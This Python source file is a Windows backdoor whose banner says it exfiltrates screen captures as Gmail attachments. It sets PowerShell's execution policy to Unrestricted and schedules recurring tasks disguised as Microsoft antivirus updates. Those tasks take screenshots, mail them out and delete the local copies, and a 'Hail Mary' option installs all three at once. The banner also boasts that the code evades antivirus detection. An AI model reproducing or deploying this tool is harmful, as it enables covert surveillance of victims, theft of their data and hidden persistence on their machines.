#!/usr/bin/env python3
'''
This tool allows to exfiltrate data using screen capture of a user activity.
Author: Viral Maniar 
Twitter: https://twitter.com/maniarviral
Github: https://github.com/Viralmaniar
LinkedIn: https://au.linkedin.com/in/viralmaniar
'''
import os, sys
import subprocess
from subprocess import check_output
	
def logo():
	logo = '''	
       __             ___
      // )    ___--""    "-.
 \ |,"( /`--""              `.     _   _   _   _   _   _   _   _   _   _      _   _   _
  \/ o                        \   / \ / \ / \ / \ / \ / \ / \ / \ / \ / \    / \ / \ / \ 
  (   _.-.              ,'"    ; ( P | o | w | e | r | S | h | e | l | l )  ( R | A | T )
   |\"   /`. \  ,      /       |   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/    \_/ \_/ \_/
   | \  ' .'`.; |      |       \.______________________________
     _-'.'    | |--.....\_    \________------------""""""""""""
    ..."   _-'.'       ___"-   )
          ..."        ------~""
                                                                          
[+] Author: Viral Maniar
[+] Twitter: @ManiarViral
[+] Description: Python based backdoor that uses Gmail to exfiltrate data as an attachment.
[+] Note: This backdoor does not require administrator privileges. This piece of code is Fully UnDetectable (FUD) by Anti-Virus (AV) software.
[+] Python version: 3.6.3
[+] PowerShell version: 5.1
'''
	return logo

OPTIONS = '''
1. Set Execution Policy to Unrestricted
2. Take screen shot
3. Schedule a task to take screen shots
4. Extract data via email
5. Schedule a task for data ex-filtration
6. Delete screen shots
7. Schedule a task to delete screen shots
8. Hail Mary: Quick backdoor
9. Exit
'''

def menu():
	while True:
		try:
			choice = str(input('\n[?] Do you want to continue? \n> ')).lower()
			if choice[0] == 'y':
				return
			if choice[0] == 'n':
				sys.exit(0)
				break
		except ValueError:
			sys.exit(0)

def checkHostWindows():
	if os.name == "nt":
		print ('[+] All good....')
	else:
		print ('[!] Please run the application on Windows machine')
		sys.exit(0)

def cmd_exectionPolicy():

	process=subprocess.Popen(["powershell","Set-ExecutionPolicy Unrestricted"], shell=False);
	result=process.communicate()[0]
	print(result)
	print ("Execution Policy is now set to unrestricted...")
	
def cmd_takeScreenshot():

	process=subprocess.Popen(["powershell","Shoot.ps1"], shell=False);
	result1=process.communicate()[0]
	print(result1)
	print ("ScreenShot taken successfully...")

def cmd_ScreenShotTaskScheduler():

	process=subprocess.Popen(["powershell","schtasks /create /sc minute /mo 1 /tn MicrosoftAntiVirusCriticalUpdatesCore /tr C:\Python36\Shoot.vbs"], shell=False);
	result2=process.communicate()[0]
	print(result2)
	print ("Task scheduled successfully...")

def cmd_sendMail():
	
	process=subprocess.Popen(["powershell","Mail.ps1"], shell=False);
	result3=process.communicate()[0]
	print(result3)
	

def cmd_MailTaskScheduler():
	
	process=subprocess.Popen(["powershell","schtasks /create /sc minute /mo 5 /tn MicrosoftAntiVirusCriticalUpdatesUA /tr C:\Python36\Mail.vbs"], shell=False);
	result4=process.communicate()[0]
	print(result4)
	print ("Task for data ex-filtration scheduled successfully...")
	
def cmd_deleteScreenShot():
	
	process=subprocess.Popen(["powershell","Remove-Item $env:USERPROFILE\Documents\ScreenShot\*.*"], shell=False);
	result5=process.communicate()[0]
	print(result5)
	print ("All files deleted successfully...")
	
def cmd_deleteTaskScheduler():
	
	process=subprocess.Popen(["powershell","schtasks /create /sc minute /mo 12 /tn MicrosoftAntiVirusCriticalUpdatesDF /tr C:\Python36\delScreenShot.vbs"], shell=False);
	result6=process.communicate()[0]
	print(result6)
	print ("Task for deleting data scheduled successfully...")
	
def cmd_HailMary():
	cmd_ScreenShotTaskScheduler()
	cmd_MailTaskScheduler()
	cmd_deleteTaskScheduler()
	print ("Backdoor successful...")
		
cmds = {
	"1" : cmd_exectionPolicy,
	"2" : cmd_takeScreenshot,
	"3" : cmd_ScreenShotTaskScheduler,
	"4" : cmd_sendMail,
	"5" : cmd_MailTaskScheduler,
	"6" : cmd_deleteScreenShot,
	"7" : cmd_deleteTaskScheduler,
	"8" : cmd_HailMary,
	"9" : lambda: sys.exit(0)
}

def main():
	os.system('cls')
	print (logo())
	checkHostWindows()
	try:
		while True:
			choice = input("\n%s" % OPTIONS)
			if choice not in cmds:
				print ('[!] Invalid Choice')
				continue
			cmds.get(choice)()
	except KeyboardInterrupt:
		print ('[!] Ctrl + C detected\n[!] Exiting')
		sys.exit(0)
	except EOFError:
		print ('[!] Ctrl + D detected\n[!] Exiting')
		sys.exit(0)

if __name__ == "__main__":
	main()
